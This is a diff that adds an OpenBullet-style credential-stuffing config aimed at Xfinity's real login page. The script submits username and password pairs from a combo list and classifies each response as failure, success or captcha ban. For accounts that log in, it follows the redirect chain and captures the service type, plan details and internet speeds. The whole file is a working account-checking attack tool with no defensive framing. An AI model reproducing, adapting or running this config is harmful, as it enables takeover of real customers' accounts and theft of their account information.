@@ -1,0 +1,189 @@
+[SETTINGS]
+{
+  "Name": "xFinity",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-12-07T07:54:42.5466897-06:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://login.xfinity.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"reqId\": \"" "\"" -> VAR "reqId" 
+
+REQUEST POST "https://login.xfinity.com/login" 
+  CONTENT "user=<USER>&passwd=<PASS>&r=comcast.net&s=portal&deviceAuthn=false&continue=http%3A%2F%2Fxfinity.comcast.net%2F&ipAddrAuthn=false&forceAuthn=0&lang=en&passive=false&reqId=<reqId>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "The username or password you entered was incorrect" 
+    KEY "Please reset your Xfinity password" 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" EqualTo "https://my.xfinity.com/?cid=cust" 
+  KEYCHAIN Ban OR 
+    KEY "Type the moving characters" 
+
+FUNCTION CurrentUnixTime -> VAR "TIME" 
+
+FUNCTION Substring "0" "10" "<TIME>" -> VAR "TIME" 
+
+REQUEST GET "https://www.xfinity.com/learn/-/cima-login?continue=%2flearn%2fcima%2flogin%3fReferer%3d%252fbuy%252fplan%252fMyplan%252f" AutoRedirect=FALSE 
+  
+  HEADER "Host: www.xfinity.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://www.xfinity.com/buy/plan/Myplan/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+REQUEST GET "<HEADERS(Location)>" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "Host: auth.xfinity.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+REQUEST GET "<HEADERS(Location)>" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "Host: auth.xfinity.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+REQUEST GET "<HEADERS(Location)>" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "Host: auth.xfinity.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+REQUEST GET "<HEADERS(Location)>" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "Host: auth.xfinity.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+REQUEST GET "<HEADERS(Location)>" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "Host: auth.xfinity.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+REQUEST GET "https://www.xfinity.com/buy/plan/Myplan/" AutoRedirect=FALSE ReadResponseSource=FALSE 
+  
+  HEADER "Host: auth.xfinity.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+REQUEST GET "https://www.xfinity.com/buy/plan/api/customer/accounts/details" 
+  
+  HEADER "Host: auth.xfinity.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+REQUEST GET "https://www.xfinity.com/buy/plan/api/route/validateRoute" AutoRedirect=FALSE 
+  
+  HEADER "Host: auth.xfinity.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+REQUEST GET "https://www.xfinity.com/buy/plan/api/authentication" 
+  
+  HEADER "Host: auth.xfinity.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+REQUEST GET "https://www.xfinity.com/buy/plan/api/myplan" 
+  
+  HEADER "Host: auth.xfinity.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "errorDescription\": \"Un authorize and Redirect to CIMA\"" 
+  KEYCHAIN Success OR 
+    KEY "responseStatus\": \"Success\"," 
+
+PARSE "<SOURCE>" JSON "packages" Recursive=TRUE -> VAR "1" 
+
+PARSE "<1>" JSON "tierOfServices" -> VAR "2" 
+
+PARSE "<2>" JSON "lineOfBusiness" Recursive=TRUE CreateEmpty=FALSE -> CAP "Service Type" 
+
+IF "<2>" DoesNotContain "description\": \"\","
+
+PARSE "<2>" JSON "description" Recursive=TRUE CreateEmpty=FALSE -> CAP "description" 
+
+ENDIF
+
+PARSE "<SOURCE>" JSON "priceType" CreateEmpty=FALSE -> CAP "Plan Expire" 
+
+IF "<Service Type>" Contains "Internet"
+
+PARSE "<SOURCE>" JSON "internetDownloadSpeedMbps" CreateEmpty=FALSE -> CAP "internetDownloadSpeedMbps" 
+
+PARSE "<SOURCE>" JSON "internetUploadSpeedMbps" CreateEmpty=FALSE -> CAP "internetUploadSpeedMbps" 
+
+ENDIF
+
